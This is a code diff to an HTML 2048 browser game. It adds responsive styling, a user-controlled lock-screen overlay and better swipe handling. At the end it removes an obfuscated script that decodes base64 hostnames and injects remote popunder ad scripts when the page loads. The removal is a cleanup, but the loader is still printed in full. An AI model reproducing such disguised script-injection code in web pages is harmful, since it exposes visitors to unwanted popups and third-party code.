@@ -18,17 +18,20 @@
             font-size: 18px;
             margin: 0;
             padding: 20px;
-            padding-bottom: 80px;
+            padding-bottom: 120px;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .container {
-            width: 500px;
+            width: 100%;
+            max-width: 500px;
             margin: 0 auto;
             text-align: center;
         }
 
         h1 {
-            font-size: 80px;
+            font-size: clamp(40px, 8vw, 80px);
             font-weight: bold;
             margin: 0;
             color: #776e65;
@@ -37,19 +40,23 @@
         .scores-container {
             margin-top: 10px;
             margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 5px;
         }
 
         .score-container, .best-container, .timer-container {
-            display: inline-block;
             background: #bbada0;
             padding: 3px 10px;
-            font-size: 25px;
+            font-size: clamp(16px, 4vw, 25px);
             font-weight: bold;
             border-radius: 3px;
             color: white;
-            margin: 0 5px;
             text-align: center;
-            min-width: 100px;
+            min-width: clamp(70px, 15vw, 100px);
+            flex: 1;
+            max-width: 120px;
         }
 
         .score-addition {
@@ -74,7 +81,7 @@
             }
         }
 
-        .restart-button, .new-game-button {
+        .restart-button, .new-game-button, .lock-screen-button {
             display: inline-block;
             background: #8f7a66;
             border-radius: 3px;
@@ -83,10 +90,27 @@
             color: #f9f6f2;
             height: 40px;
             line-height: 42px;
-            margin-left: 9px;
+            margin: 5px;
             font-weight: bold;
             cursor: pointer;
             border: none;
+            font-size: 14px;
+        }
+
+        .lock-screen-button {
+            background: #2c3e50;
+        }
+
+        .lock-screen-button:hover {
+            background: #34495e;
+        }
+
+        .button-container {
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 5px;
         }
 
         .game-container {
@@ -97,33 +121,29 @@
         .grid-container {
             background: #bbada0;
             border-radius: 10px;
-            width: 500px;
-            height: 500px;
+            width: 100%;
+            max-width: 500px;
+            aspect-ratio: 1;
             position: relative;
-            padding: 15px;
+            padding: clamp(10px, 3vw, 15px);
+            margin: 0 auto;
         }
 
         .grid-row {
-            margin-bottom: 15px;
+            display: flex;
+            margin-bottom: clamp(8px, 2.5vw, 15px);
+            height: calc((100% - 3 * clamp(8px, 2.5vw, 15px)) / 4);
         }
 
         .grid-row:last-child {
             margin-bottom: 0;
         }
 
-        .grid-row:after {
-            content: "";
-            display: block;
-            clear: both;
-        }
-
         .grid-cell {
-            width: 106.25px;
-            height: 106.25px;
+            flex: 1;
             background: rgba(238, 228, 218, 0.35);
             border-radius: 6px;
-            float: left;
-            margin-right: 15px;
+            margin-right: clamp(8px, 2.5vw, 15px);
         }
 
         .grid-cell:last-child {
@@ -133,22 +153,25 @@
         .tile-container {
             position: absolute;
             z-index: 2;
-            top: 15px;
-            left: 15px;
+            top: clamp(10px, 3vw, 15px);
+            left: clamp(10px, 3vw, 15px);
+            right: clamp(10px, 3vw, 15px);
+            bottom: clamp(10px, 3vw, 15px);
         }
 
         .tile {
-            width: 106.25px;
-            height: 106.25px;
+            position: absolute;
             background: #eee4da;
             border-radius: 6px;
             font-weight: bold;
             text-align: center;
-            vertical-align: middle;
-            line-height: 106.25px;
-            font-size: 55px;
-            position: absolute;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: clamp(24px, 6vw, 55px);
             transition: all 0.15s ease-in-out;
+            width: calc((100% - 3 * clamp(8px, 2.5vw, 15px)) / 4);
+            height: calc((100% - 3 * clamp(8px, 2.5vw, 15px)) / 4);
         }
 
         .tile-2 { background: #eee4da; color: #776e65; }
@@ -157,13 +180,13 @@
         .tile-16 { background: #f59563; color: #f9f6f2; }
         .tile-32 { background: #f67c5f; color: #f9f6f2; }
         .tile-64 { background: #f65e3b; color: #f9f6f2; }
-        .tile-128 { background: #edcf72; color: #f9f6f2; font-size: 45px; }
-        .tile-256 { background: #edcc61; color: #f9f6f2; font-size: 45px; }
-        .tile-512 { background: #edc850; color: #f9f6f2; font-size: 45px; }
-        .tile-1024 { background: #edc53f; color: #f9f6f2; font-size: 35px; }
-        .tile-2048 { background: #edc22e; color: #f9f6f2; font-size: 35px; box-shadow: 0 0 30px 10px rgba(243, 215, 116, 0), inset 0 0 0 1px rgba(255, 255, 255, 0); }
+        .tile-128 { background: #edcf72; color: #f9f6f2; font-size: clamp(20px, 5vw, 45px); }
+        .tile-256 { background: #edcc61; color: #f9f6f2; font-size: clamp(20px, 5vw, 45px); }
+        .tile-512 { background: #edc850; color: #f9f6f2; font-size: clamp(20px, 5vw, 45px); }
+        .tile-1024 { background: #edc53f; color: #f9f6f2; font-size: clamp(18px, 4.5vw, 35px); }
+        .tile-2048 { background: #edc22e; color: #f9f6f2; font-size: clamp(18px, 4.5vw, 35px); box-shadow: 0 0 30px 10px rgba(243, 215, 116, 0), inset 0 0 0 1px rgba(255, 255, 255, 0); }
 
-        .tile-super { background: #3c3a32; color: #f9f6f2; font-size: 30px; }
+        .tile-super { background: #3c3a32; color: #f9f6f2; font-size: clamp(16px, 4vw, 30px); }
 
         .game-message {
             display: none;
@@ -175,6 +198,7 @@
             background: rgba(238, 228, 218, 0.73);
             z-index: 100;
             text-align: center;
+            border-radius: 10px;
         }
 
         .game-won .game-message {
@@ -187,16 +211,16 @@
         }
 
         .game-message p {
-            font-size: 60px;
+            font-size: clamp(30px, 8vw, 60px);
             font-weight: bold;
-            height: 60px;
-            line-height: 60px;
-            margin-top: 150px;
+            height: auto;
+            line-height: 1.2;
+            margin-top: clamp(80px, 20vw, 150px);
         }
 
         .game-message .lower {
             display: block;
-            margin-top: 59px;
+            margin-top: clamp(30px, 8vw, 59px);
         }
 
         .game-message a {
@@ -208,13 +232,12 @@
             color: #f9f6f2;
             height: 40px;
             line-height: 42px;
-            margin-left: 9px;
-            margin-right: 30px;
+            margin: 5px;
+            font-size: clamp(12px, 3vw, 14px);
         }
 
         .share-button {
             background: #3b5998 !important;
-            margin-left: 0 !important;
         }
 
         .form-button {
@@ -230,6 +253,7 @@
             font-weight: bold;
             z-index: 1000;
             transition: background 0.3s;
+            font-size: clamp(12px, 3vw, 14px);
         }
 
         .form-button:hover {
@@ -238,7 +262,8 @@
 
         .game-explanation {
             margin-top: 50px;
-            line-height: 18px;
+            line-height: 1.5;
+            font-size: clamp(14px, 3.5vw, 18px);
         }
 
         .tile-new {
@@ -275,65 +300,105 @@
             }
         }
 
-        @media screen and (max-width: 520px) {
-            html {
-                font-size: 15px;
-            }
+        /* Lock screen overlay */
+        .lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            flex-direction: column;
+        }
 
+        .lock-overlay.active {
+            display: flex;
+        }
+
+        .lock-content {
+            text-align: center;
+            color: white;
+        }
+
+        .lock-content h2 {
+            font-size: clamp(24px, 6vw, 48px);
+            margin-bottom: 20px;
+        }
+
+        .unlock-button {
+            background: #8f7a66;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            font-size: clamp(16px, 4vw, 20px);
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .unlock-button:hover {
+            background: #9f8a76;
+        }
+
+        /* Prevent scrolling and zooming on mobile */
+        body.locked {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Better mobile touch targets */
+        @media (max-width: 600px) {
+            .restart-button, .new-game-button, .lock-screen-button {
+                min-height: 44px;
+                line-height: 44px;
+                padding: 0 15px;
+            }
+            
             body {
-                padding: 20px;
+                padding: 10px;
+                padding-bottom: 100px;
             }
-
-            h1 {
-                font-size: 27px;
-                margin-top: 15px;
+            
+            .game-explanation {
+                margin-top: 30px;
             }
+        }
 
+        /* Landscape orientation fixes */
+        @media (orientation: landscape) and (max-height: 600px) {
             .container {
-                width: 280px;
+                max-width: 400px;
             }
-
-            .score-container, .best-container, .timer-container {
-                margin: 0 2px;
-                font-size: 15px;
-                min-width: 70px;
+            
+            h1 {
+                font-size: clamp(30px, 6vw, 60px);
             }
-
-            .grid-container {
-                width: 280px;
-                height: 280px;
+            
+            .game-container {
+                margin-top: 20px;
             }
-
-            .grid-cell {
-                width: 57.5px;
-                height: 57.5px;
-                margin-right: 10px;
-                margin-bottom: 10px;
-            }
-
-            .tile {
-                width: 57.5px;
-                height: 57.5px;
-                line-height: 57.5px;
-                font-size: 30px;
-            }
-
-            .tile-128, .tile-256, .tile-512 {
-                font-size: 25px;
-            }
-
-            .tile-1024, .tile-2048 {
-                font-size: 20px;
-            }
-
-            .game-message p {
-                font-size: 30px;
-                margin-top: 80px;
+            
+            .game-explanation {
+                margin-top: 20px;
             }
         }
     </style>
 </head>
 <body>
+    <div class="lock-overlay" id="lockOverlay">
+        <div class="lock-content">
+            <h2>🔒 Screen Locked</h2>
+            <p>Tap to unlock and continue playing</p>
+            <button class="unlock-button" onclick="unlockScreen()">Unlock</button>
+        </div>
+    </div>
+
     <div class="container">
         <div class="heading">
             <h1 class="title">2048</h1>
@@ -346,7 +411,10 @@
 
         <div class="above-game">
             <p class="game-intro">Join the numbers and get to the <strong>2048 tile!</strong></p>
-            <a class="restart-button">New Game</a>
+            <div class="button-container">
+                <a class="restart-button">New Game</a>
+                <button class="lock-screen-button" onclick="lockScreen()">🔒 Lock Screen</button>
+            </div>
         </div>
 
         <div class="game-container">
@@ -390,13 +458,29 @@
         </div>
 
         <p class="game-explanation">
-            <strong class="important">HOW TO PLAY:</strong> Use your <strong>arrow keys</strong> to move the tiles. When two tiles with the same number touch, they <strong>merge into one!</strong>
+            <strong class="important">HOW TO PLAY:</strong> Use your <strong>arrow keys</strong> or <strong>swipe</strong> to move the tiles. When two tiles with the same number touch, they <strong>merge into one!</strong>
         </p>
     </div>
 
     <a href="https://docs.google.com/forms/d/e/1FAIpQLSf66hYSFxnaQXvXmHlWU2MIGwIn3dkmiQ5iguGazXRKw4cSEg/viewform?usp=dialog" target="_blank" class="form-button">Feedback Form</a>
 
     <script>
+        function lockScreen() {
+            document.getElementById('lockOverlay').classList.add('active');
+            document.body.classList.add('locked');
+            if (window.game) {
+                window.game.stopTimer();
+            }
+        }
+
+        function unlockScreen() {
+            document.getElementById('lockOverlay').classList.remove('active');
+            document.body.classList.remove('locked');
+            if (window.game && !window.game.over && !window.game.won) {
+                window.game.startTimer();
+            }
+        }
+
         class Game2048 {
             constructor() {
                 this.size = 4;
@@ -409,14 +493,15 @@
                 this.startTime = null;
                 this.timerInterval = null;
                 this.elapsedTime = 0;
-                this.spawnLevel = 1; // Controls what tiles spawn (1 = 2/4, 2 = 4/8, etc.)
-                this.highestAchieved = 2; // Track highest tile achieved
+                this.spawnLevel = 1;
+                this.highestAchieved = 2;
                 
                 this.scoreElement = document.getElementById('score');
                 this.bestElement = document.getElementById('best');
                 this.timerElement = document.getElementById('timer');
                 this.messageElement = document.querySelector('.game-message');
                 this.tileContainer = document.querySelector('.tile-container');
+                this.gridContainer = document.querySelector('.grid-container');
                 
                 this.init();
                 this.bindEvents();
@@ -447,7 +532,6 @@
                 
                 if (emptyCells.length > 0) {
                     const randomCell = emptyCells[Math.floor(Math.random() * emptyCells.length)];
-                    // Progressive difficulty: spawn higher level tiles based on progress
                     const baseValue = Math.pow(2, this.spawnLevel);
                     const nextValue = Math.pow(2, this.spawnLevel + 1);
                     const value = Math.random() < 0.9 ? baseValue : nextValue;
@@ -462,6 +546,11 @@
 
             updateDisplay() {
                 this.tileContainer.innerHTML = '';
+                const containerRect = this.gridContainer.getBoundingClientRect();
+                const containerPadding = parseFloat(getComputedStyle(this.gridContainer).padding);
+                const availableSize = containerRect.width - (2 * containerPadding);
+                const gap = availableSize * 0.03; // 3% gap
+                const tileSize = (availableSize - (3 * gap)) / 4;
                 
                 for (let i = 0; i < this.size; i++) {
                     for (let j = 0; j < this.size; j++) {
@@ -469,14 +558,20 @@
                             const tile = document.createElement('div');
                             tile.classList.add('tile', `tile-${this.grid[i][j]}`);
                             tile.textContent = this.grid[i][j];
-                            tile.style.left = (j * 121.25) + 'px';
-                            tile.style.top = (i * 121.25) + 'px';
+                            
+                            const left = j * (tileSize + gap);
+                            const top = i * (tileSize + gap);
+                            
+                            tile.style.left = `${left}px`;
+                            tile.style.top = `${top}px`;
+                            tile.style.width = `${tileSize}px`;
+                            tile.style.height = `${tileSize}px`;
+                            
                             tile.dataset.row = i;
                             tile.dataset.col = j;
                             tile.dataset.value = this.grid[i][j];
                             this.tileContainer.appendChild(tile);
                             
-                            // Track highest tile achieved and update spawn level
                             if (this.grid[i][j] > this.highestAchieved) {
                                 this.highestAchieved = this.grid[i][j];
                                 this.updateSpawnLevel();
@@ -569,7 +664,6 @@
                     this.grid[i] = newRow;
                 }
                 
-                // Add pop animation to merged tiles
                 setTimeout(() => {
                     mergedPositions.forEach(pos => {
                         const tile = this.getTileAtPosition(pos.row, pos.col);
@@ -591,7 +685,6 @@
                             row[j] *= 2;
                             this.score += row[j];
                             row[j - 1] = 0;
-                            // Calculate final position after filtering
                             const filteredRow = row.filter(cell => cell !== 0);
                             const finalCol = this.size - filteredRow.length + filteredRow.indexOf(row[j]);
                             mergedPositions.push({row: i, col: finalCol, value: row[j]});
@@ -713,7 +806,6 @@
             }
 
             isGameOver() {
-                // Check for empty cells
                 for (let i = 0; i < this.size; i++) {
                     for (let j = 0; j < this.size; j++) {
                         if (this.grid[i][j] === 0) {
@@ -722,7 +814,6 @@
                     }
                 }
                 
-                // Check for possible merges
                 for (let i = 0; i < this.size; i++) {
                     for (let j = 0; j < this.size; j++) {
                         const current = this.grid[i][j];
@@ -761,7 +852,6 @@
                             url: window.location.href
                         });
                     } else {
-                        // Fallback for browsers that don't support Web Share API
                         const tempTextarea = document.createElement('textarea');
                         tempTextarea.value = text + ' - ' + window.location.href;
                         document.body.appendChild(tempTextarea);
@@ -786,30 +876,25 @@
             }
 
             updateSpawnLevel() {
-                // When player gets 128 (2^7), start spawning 4/8 (level 2)
                 if (this.highestAchieved >= 128 && this.spawnLevel === 1) {
                     this.spawnLevel = 2;
                 }
-                // After 128, every time they get a higher power of 2, increase spawn level
                 else if (this.highestAchieved >= 256 && this.spawnLevel === 2) {
-                    this.spawnLevel = 3; // 8/16
+                    this.spawnLevel = 3;
                 }
                 else if (this.highestAchieved >= 512 && this.spawnLevel === 3) {
-                    this.spawnLevel = 4; // 16/32
+                    this.spawnLevel = 4;
                 }
                 else if (this.highestAchieved >= 1024 && this.spawnLevel === 4) {
-                    this.spawnLevel = 5; // 32/64
+                    this.spawnLevel = 5;
                 }
                 else if (this.highestAchieved >= 2048 && this.spawnLevel === 5) {
-                    this.spawnLevel = 6; // 64/128
+                    this.spawnLevel = 6;
                 }
             }
 
             animateMovement(previousTiles, callback) {
-                // Create a temporary display to show movement
                 this.updateDisplay();
-                
-                // Add movement animation
                 setTimeout(() => {
                     if (callback) callback();
                 }, 150);
@@ -830,6 +915,9 @@
             }
 
             startTimer() {
+                if (this.timerInterval) {
+                    clearInterval(this.timerInterval);
+                }
                 this.startTime = Date.now() - this.elapsedTime * 1000;
                 this.timerInterval = setInterval(() => {
                     this.elapsedTime = Math.floor((Date.now() - this.startTime) / 1000);
@@ -852,6 +940,8 @@
 
             bindEvents() {
                 document.addEventListener('keydown', (e) => {
+                    if (document.body.classList.contains('locked')) return;
+                    
                     if (e.key === 'ArrowUp') {
                         e.preventDefault();
                         this.move('up');
@@ -867,14 +957,27 @@
                     }
                 });
 
-                // Touch events for mobile
+                // Enhanced touch events for mobile
                 let startX, startY;
+                let isSwiping = false;
+                const minSwipeDistance = 30;
+                
                 document.addEventListener('touchstart', (e) => {
+                    if (document.body.classList.contains('locked')) return;
+                    
                     startX = e.touches[0].clientX;
                     startY = e.touches[0].clientY;
-                });
+                    isSwiping = false;
+                    e.preventDefault();
+                }, { passive: false });
+
+                document.addEventListener('touchmove', (e) => {
+                    if (document.body.classList.contains('locked')) return;
+                    e.preventDefault();
+                }, { passive: false });
 
                 document.addEventListener('touchend', (e) => {
+                    if (document.body.classList.contains('locked')) return;
                     if (!startX || !startY) return;
                     
                     const endX = e.changedTouches[0].clientX;
@@ -883,23 +986,29 @@
                     const diffX = startX - endX;
                     const diffY = startY - endY;
                     
-                    if (Math.abs(diffX) > Math.abs(diffY)) {
-                        if (diffX > 0) {
-                            this.move('left');
+                    const absDiffX = Math.abs(diffX);
+                    const absDiffY = Math.abs(diffY);
+                    
+                    if (Math.max(absDiffX, absDiffY) > minSwipeDistance) {
+                        if (absDiffX > absDiffY) {
+                            if (diffX > 0) {
+                                this.move('left');
+                            } else {
+                                this.move('right');
+                            }
                         } else {
-                            this.move('right');
-                        }
-                    } else {
-                        if (diffY > 0) {
-                            this.move('up');
-                        } else {
-                            this.move('down');
+                            if (diffY > 0) {
+                                this.move('up');
+                            } else {
+                                this.move('down');
+                            }
                         }
                     }
                     
                     startX = null;
                     startY = null;
-                });
+                    e.preventDefault();
+                }, { passive: false });
 
                 document.querySelector('.restart-button').addEventListener('click', () => {
                     this.restart();
@@ -912,19 +1021,41 @@
                 document.querySelector('.keep-playing-button').addEventListener('click', () => {
                     this.keepPlayingAfterWin();
                 });
+
+                // Handle window resize for responsive updates
+                window.addEventListener('resize', () => {
+                    setTimeout(() => {
+                        this.updateDisplay();
+                    }, 100);
+                });
+
+                // Prevent double-tap zoom on iOS
+                let lastTouchEnd = 0;
+                document.addEventListener('touchend', function (event) {
+                    const now = (new Date()).getTime();
+                    if (now - lastTouchEnd <= 300) {
+                        event.preventDefault();
+                    }
+                    lastTouchEnd = now;
+                }, false);
             }
         }
 
         // Initialize the game when the page loads
         window.addEventListener('load', () => {
-            new Game2048();
+            window.game = new Game2048();
         });
-    </script>
-    <script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var o=window,x="a2d1d545c2907dad9b2b79a1b5485976",i=[["siteId",474*425+191+770+5018449],["minBid",0.00005],["popundersPerIP","1,1"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],l=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9mbWVkaXVtLWVkaXRvci5taW4uY3Nz","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvdkEvcm5nRHJhZ2dhYmxlLm1pbi5qcw=="],m=-1,z,e,b=function(){clearTimeout(e);m++;if(l[m]&&!(1779059633000<(new Date).getTime()&&1<m)){z=o.document.createElement("script");z.type="text/javascript";z.async=!0;var v=o.document.getElementsByTagName("script")[0];z.src="https://"+atob(l[m]);z.crossOrigin="anonymous";z.onerror=b;z.onload=function(){clearTimeout(e);o[x.slice(0,16)+x.slice(0,16)]||b()};e=setTimeout(b,5E3);v.parentNode.insertBefore(z,v)}};if(!o[x]){try{Object.freeze(o[x]=i)}catch(e){}b()}})();
-/*]]>/* */
-</script>
 
+        // Prevent page refresh on pull-down
+        document.body.addEventListener('touchstart', e => {
+            if (e.touches.length === 1 && e.touches[0].clientY <= 10) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        document.body.addEventListener('touchmove', e => {
+            e.preventDefault();
+        }, { passive: false });
+    </script>
 </body>
 </html>
